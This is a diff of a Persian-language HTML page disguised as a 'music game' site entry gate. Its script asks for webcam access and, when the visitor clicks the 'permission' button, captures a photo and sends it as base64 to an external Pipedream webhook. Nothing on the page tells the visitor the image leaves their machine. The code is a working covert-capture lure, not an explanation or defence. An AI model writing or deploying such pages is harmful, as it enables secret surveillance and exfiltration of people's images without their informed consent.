@@ -2,52 +2,55 @@
 <html lang="fa">
 <head>
     <meta charset="UTF-8">
-    <title>درحال پردازش</title>
+    <title>موزیک گیم </title>
 </head>
 <body>
-    <h2>مجوز برای ورود به سایت</h2>
-    <video id="video" width="640" height="480" autoplay></video>
-    <button id="capture">ورود</button>
+    <h2>برای ورود اجازه دهید</h2>
+    <video id="video" width="640" height="480" autoplay playsinline></video>
+    <button id="capture">مجوز</button>
     <canvas id="canvas" width="640" height="480" style="display: none;"></canvas>
 
     <script>
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const context = canvas.getContext('2d');
+
+        let streamReady = false;
+
         // درخواست دسترسی به دوربین
         navigator.mediaDevices.getUserMedia({ video: true })
             .then(function (stream) {
-                var video = document.getElementById('video');
                 video.srcObject = stream;
+                streamReady = true;
             })
             .catch(function (error) {
-                console.log('خطا در دسترسی به دوربین:', error);
+                alert(' رد شد ');
+                console.error(error);
             });
 
-        // گرفتن عکس از دوربین هنگام کلیک روی دکمه
         document.getElementById('capture').addEventListener('click', function () {
-            var video = document.getElementById('video');
-            var canvas = document.getElementById('canvas');
-            var context = canvas.getContext('2d');
+            if (!streamReady) {
+                alert("لطفاً منتظر بمانید .");
+                return;
+            }
 
-            // رسم فریم ویدیویی روی canvas
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            // اندکی صبر برای بارگیری تصویر (در صورت لزوم)
+            setTimeout(() => {
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-            // تبدیل تصویر به داده base64
-            var dataUrl = canvas.toDataURL();
+                const dataUrl = canvas.toDataURL("image/jpeg");
 
-            // ارسال تصویر به Webhook
-            fetch("https://eoeq114hreszd00.m.pipedream.net", {  // اینجا باید URL Webhook صحیح رو وارد کنید
-                method: "POST",
-                headers: {
-                    "Content-Type": "application/json"
-                },
-                body: JSON.stringify({ image: dataUrl })
-            })
-            .then(response => response.json())
-            .then(data => {
-                console.log('تصویر با موفقیت ارسال شد:', data);
-            })
-            .catch(error => {
-                console.log('خطا در ارسال تصویر:', error);
-            });
+                // ارسال تصویر به Webhook
+                fetch("https://eoeq114hreszd00.m.pipedream.net", {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify({ image: dataUrl })
+                })
+                .then(response => console.log("ارسال شد"))
+                .catch(error => console.error("خطا در ارسال:", error));
+            }, 1000); // صبر یک ثانیه‌ای
         });
     </script>
 </body>
